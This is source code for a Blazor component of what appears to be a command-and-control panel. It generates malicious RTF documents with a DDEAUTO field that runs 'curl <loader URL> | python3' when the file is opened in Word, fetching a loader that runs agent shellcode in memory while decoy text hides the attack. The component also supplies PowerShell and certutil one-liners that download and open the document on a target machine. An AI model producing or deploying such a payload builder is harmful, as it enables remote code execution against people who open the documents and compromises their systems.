@inject IJSRuntime JS

<div class="tool-panel">
    <div class="tool-header">
        <h3 class="tool-title">RTF Generator</h3>
        <p class="tool-subtitle">Generate RTF documents that execute the Python loader via DDE — no macros or templates needed.</p>
    </div>

    <div class="loader-content">
        <div class="loader-section">
            <h4 class="loader-section-title">Overview</h4>
            <p class="loader-text">
                Generates an RTF document with a DDE (Dynamic Data Exchange) field that runs the Python loader
                one-liner when the document is opened in Microsoft Word. No VBA macros, no remote templates
                — the RTF itself triggers the command. The user sees a single "Update links?" prompt.
            </p>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">Supported Platforms</h4>
            <div class="loader-platforms">
                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> Windows</span>
            </div>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">1 — Python Loader URL</h4>
            <p class="loader-text rtf-field-hint">
                URL of the Python loader script. The DDE field will run <code>curl URL | python3</code> when the document is opened.
            </p>
            <C2InputActions Value="@_loaderUrl" ValueChanged="v => { _loaderUrl = v; Rebuild(); }" Monospace BindOnInput
                            Placeholder="https://raw.githubusercontent.com/.../loader.py" />
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">2 — Document Content</h4>
            <p class="loader-text rtf-field-hint">
                Decoy text shown after the DDE field executes. This is what the target sees in the document.
            </p>
            <C2Input Value="@_docTitle" ValueChanged="v => { _docTitle = v; Rebuild(); }" BindOnInput
                     Placeholder="Document title" CssClass="rtf-input-spacing" />
            <textarea class="rtf-textarea" @bind="_docBody" @bind:event="oninput" @bind:after="Rebuild"
                      placeholder="Document body text..." rows="4"></textarea>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">3 — Generated RTF</h4>
            <div class="rtf-preview-wrap">
                <pre class="rtf-preview">@_rtfContent</pre>
            </div>
            <div class="rtf-actions">
                <button class="loader-link-btn" @onclick="DownloadRtf">
                    <C2Icon Name="download" Size="Size.Xs" /> Download RTF
                </button>
                <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_rtfContent)" title="Copy RTF source">
                    <C2Icon Name="copy" Size="Size.Xs" /> Copy
                </button>
            </div>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">Delivery One-Liners</h4>

            <span class="loader-command-label">PowerShell (download &amp; open)</span>
            <div class="loader-command">
                <code class="loader-code">irm @_rtfHostUrl -OutFile $env:TEMP\doc.rtf; Start-Process $env:TEMP\doc.rtf</code>
                <button class="loader-copy-btn" @onclick='() => Copy($"irm {_rtfHostUrl} -OutFile $env:TEMP\\doc.rtf; Start-Process $env:TEMP\\doc.rtf")' title="Copy">
                    <C2Icon Name="copy" Size="Size.Xs" />
                </button>
            </div>

            <span class="loader-command-label">CMD (certutil)</span>
            <div class="loader-command">
                <code class="loader-code">certutil -urlcache -split -f @_rtfHostUrl %TEMP%\doc.rtf &amp;&amp; start %TEMP%\doc.rtf</code>
                <button class="loader-copy-btn" @onclick='() => Copy($"certutil -urlcache -split -f {_rtfHostUrl} %TEMP%\\doc.rtf && start %TEMP%\\doc.rtf")' title="Copy">
                    <C2Icon Name="copy" Size="Size.Xs" />
                </button>
            </div>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">How It Works</h4>
            <p class="loader-text">
                1. Target opens the RTF in Microsoft Word<br/>
                2. Word prompts "This document contains links … Do you want to update?"<br/>
                3. On accept, the DDE field executes: <code>cmd /c curl [loader URL] | python3</code><br/>
                4. The Python loader downloads the agent shellcode and runs it in memory<br/>
                5. The document displays the decoy content
            </p>
        </div>
    </div>
</div>

@code {
    private const string DefaultLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/loader.py";

    private string _loaderUrl = DefaultLoaderUrl;
    private string _docTitle = "";
    private string _docBody = "";
    private string _rtfHostUrl = "https://your-server.com/document.rtf";
    private string _rtfContent = "";

    protected override void OnInitialized() => Rebuild();

    private void Rebuild()
    {
        _rtfContent = GenerateRtf(_loaderUrl, _docTitle, _docBody);
    }

    private static string GenerateRtf(string loaderUrl, string title, string body)
    {
        // Build the DDE command: cmd silently runs curl <url> | python3
        // DDEAUTO runs automatically; the first arg is the program, second is the arguments
        var cmd = $"curl {loaderUrl} | python3";
        var ddeField = @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}";

        var titleRtf = string.IsNullOrWhiteSpace(title)
            ? ""
            : $"\\pard\\sa200\\sl276\\slmult1\\b\\fs28 {RtfEscape(title)}\\b0\\par\n";
        var bodyRtf = string.IsNullOrWhiteSpace(body)
            ? ""
            : $"\\pard\\sa200\\sl276\\slmult1\\fs22 {RtfEscape(body)}\\par\n";

        return @"{\rtf1\ansi\ansicpg1252\deff0" + "\n"
             + @"{\fonttbl{\f0\fswiss\fcharset0 Calibri;}}" + "\n"
             + @"{\colortbl;\red0\green0\blue0;}" + "\n"
             + @"\viewkind4\uc1\pard\lang1033\f0\fs22" + "\n"
             + ddeField + "\n"
             + titleRtf
             + bodyRtf
             + "}";
    }

    private static string RtfEscape(string s)
    {
        var sb = new System.Text.StringBuilder(s.Length);
        foreach (var c in s)
        {
            if (c == '\\') sb.Append("\\\\");
            else if (c == '{') sb.Append("\\{");
            else if (c == '}') sb.Append("\\}");
            else if (c > 127) sb.Append($"\\u{(int)c}?");
            else sb.Append(c);
        }
        return sb.ToString();
    }

    private async Task DownloadRtf()
    {
        var bytes = System.Text.Encoding.ASCII.GetBytes(_rtfContent);
        var base64 = Convert.ToBase64String(bytes);
        await JS.InvokeVoidAsync("eval", $@"
            (function() {{
                var a = document.createElement('a');
                a.href = 'data:application/rtf;base64,{base64}';
                a.download = 'document.rtf';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }})()
        ");
    }

    private void Copy(string text) => _ = JS.InvokeVoidAsync("navigator.clipboard.writeText", text);
}
